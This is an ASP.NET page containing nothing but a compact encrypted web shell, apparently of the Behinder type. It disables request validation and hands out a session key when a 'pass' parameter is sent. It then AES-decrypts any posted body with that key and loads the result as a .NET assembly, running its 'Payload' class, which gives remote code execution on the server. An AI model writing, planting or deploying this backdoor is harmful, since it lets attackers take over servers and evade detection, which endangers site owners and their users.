<%@ Page Language="C#" validateRequest="false" %>
<%
    if (Request["pass"]!=null)
    {
        Session.Add("key", Guid.NewGuid().ToString().Replace("-", "").Substring(16)); Response.Write(Session[0]); return;
    }   
    byte[] key = Encoding.Default.GetBytes(Session[0] + "");
    byte[] content = Request.BinaryRead(Request.ContentLength);
    byte[] decryptContent = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(key, key).TransformFinalBlock(content, 0, content.Length);
    System.Reflection.Assembly.Load(decryptContent).CreateInstance("Payload").Equals(this);
%>